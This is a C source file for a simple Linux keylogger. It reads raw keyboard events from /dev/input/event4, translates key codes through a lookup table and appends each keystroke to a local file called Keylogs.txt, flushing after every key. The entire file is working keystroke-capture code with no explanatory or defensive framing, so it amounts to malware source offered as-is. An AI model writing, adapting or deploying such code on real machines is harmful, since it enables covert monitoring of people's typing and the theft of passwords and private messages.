#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <unistd.h>

const char* keymap[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
    "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
    "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT",
    "*", "LALT", "SPACE", "CAPSLOCK", // Add more keys as needed
};

int main(){

    const char *my_key = "/dev/input/event4";
    int fd = open(my_key, O_RDONLY);
    if (fd == -1){
        printf("Unable to open the device file");
    };

    struct input_event ev;

    FILE *logEvent = fopen("./Keylogs.txt","a");
    while(read(fd, &ev, sizeof(struct input_event)) > 0){
        if(ev.type== EV_KEY && ev.value == 1){
            if (ev.code < sizeof(keymap) / sizeof(keymap[0])){
                if (strcmp(keymap[ev.code], "SPACE") == 0){
                    fprintf(logEvent, "\n");
                    fflush(logEvent); // Flush to ensure data is written immediately
                }else if(strcmp(keymap[ev.code], "BACKSPACE") == 0){
                    continue;
                }
                else{
                    fprintf(logEvent, "%s", keymap[ev.code]); // Log the key itself
                    fflush(logEvent); // Flush to ensure data is written immediately
                }
            }else{
                fprintf(logEvent, "Key: %i\n",ev.code);
                fflush(logEvent); // Force the OS into wrirting all the data in the buffer once it there.
            }
        }
    }

    fclose(logEvent);
    close(fd);


}
